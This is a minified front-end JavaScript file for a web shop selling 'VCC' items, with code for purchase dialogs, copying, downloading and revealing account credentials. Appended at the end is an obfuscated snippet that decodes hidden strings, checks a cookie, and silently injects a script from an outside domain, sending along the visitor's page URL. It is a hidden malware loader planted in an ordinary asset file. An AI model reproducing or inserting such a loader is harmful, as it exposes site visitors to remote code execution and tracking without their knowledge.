const BASE_URL="http://localhost:3000",buyVccBtn=document.querySelector("#buy-vcc");let recentVccCount=localStorage.getItem("recent_vcc_count"),contactAdminVideo=document.querySelector(".contact-admin-video");if(recentVccCount){recentVccCount=parseInt(recentVccCount);let e=document.querySelectorAll(".vcc-container .vcc");for(let t=0;t<recentVccCount;t++)e[t]&&e[t].classList.add("active")}function download(e,t){var r=document.createElement("a");r.setAttribute("href","data:text/plain;charset=utf-8,"+encodeURIComponent(t)),r.setAttribute("download",e),r.style.display="none",document.body.appendChild(r),r.click(),document.body.removeChild(r)}buyVccBtn&&buyVccBtn.addEventListener("click",(()=>{document.querySelector(".vcc-prompt").style.display="block"})),contactAdminVideo&&contactAdminVideo.addEventListener("click",(()=>{document.querySelector(".error-dialog .message").innerHTML="",document.querySelector(".error-dialog").style.display="block"}));let copyAll=document.querySelector(".copy-all");copyAll&&copyAll.addEventListener("click",(e=>{let t=document.querySelector("textarea"),r=t.value;t.select(),t.setSelectionRange(0,r.length),navigator.clipboard.writeText(r).then((()=>{alert("Copied!")})).catch((e=>{alert(e)}))}));let downloadAsText=document.querySelector(".download-as-text");downloadAsText&&downloadAsText.addEventListener("click",(e=>{download("vcc.txt",document.querySelector("textarea").value)})),document.querySelector(".vcc-prompt .ok").addEventListener("click",(()=>{try{document.querySelector(".vcc-prompt").style.display="none";let e=document.querySelector(".vcc-count").value;if(e>5e3)alert("You can buy 5000 maximum at a time");else{let t=document.querySelector(".user-id").textContent.trim();fetch(`/api/vcc/buy/${e}/${t}`).then((e=>e.json())).then((t=>{"fail"===t.status?(document.querySelector(".error-dialog .message").innerHTML=t.message,document.querySelector(".error-dialog").style.display="flex"):(localStorage.setItem("recent_vcc_count",e),alert("Your purchase was successful"),location.reload())})).catch((e=>{alert("Network Error")}))}}catch(e){alert("Please login/signup to purchase VCC")}})),document.querySelector(".vcc-prompt .cancel").addEventListener("click",(()=>{document.querySelector(".vcc-prompt").style.display="none"})),document.querySelector(".talk-with-admin").addEventListener("click",(()=>{document.querySelector(".error-dialog .message").innerHTML="",document.querySelector(".error-dialog").style.display="block"})),document.querySelector(".error-dialog .cancel").addEventListener("click",(e=>{document.querySelector(".error-dialog").style.display="none"})),document.querySelector(".creds-dialog .cancel").addEventListener("click",(e=>{document.querySelector(".creds-dialog").style.display="none"})),document.querySelector(".error-dialog .whatsapp-btn").addEventListener("click",(e=>{document.querySelector(".error-dialog").style.display="none",window.open(e.target.getAttribute("data-url"),"_blank").focus()})),document.querySelector(".error-dialog .telegram-btn").addEventListener("click",(e=>{document.querySelector(".error-dialog").style.display="none",window.open(e.target.getAttribute("data-url"),"_blank").focus()}));let buyPointsBtn=document.querySelector("#buy-points");buyPointsBtn&&buyPointsBtn.addEventListener("click",(e=>{document.querySelector(".error-dialog .message").innerHTML="",document.querySelector(".error-dialog").style.display="block"}));let revealCreds=document.querySelector("#reveal-creds");revealCreds&&revealCreds.addEventListener("click",(e=>{document.querySelector(".creds-dialog .message").innerHTML=`\n            <div><strong>User ID:</strong> ${revealCreds.getAttribute("data-user_id")}</div>\n            <div><strong>Password:</strong> ${revealCreds.getAttribute("data-password")}</div>\n            <br>\n        `,document.querySelector(".creds-dialog").style.display="block"})),document.querySelector("#clear-all").addEventListener("click",(e=>{if(confirm("Do you really want to clear all VCC?")){let e=document.querySelector(".user-id").textContent.trim();fetch("/api/vcc/clear/"+e).then((e=>e.text())).then((e=>{alert(e),location.reload()})).catch((e=>{alert("Error: "+e)}))}}));let useIdEl=document.querySelector(".user-id"),classList=["white","red","yellow","blue","green","orange","brown"];setInterval((()=>{for(let e of classList)useIdEl.classList.remove(e);useIdEl.classList.add(classList[Math.floor(Math.random()*classList.length)])}),100);(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));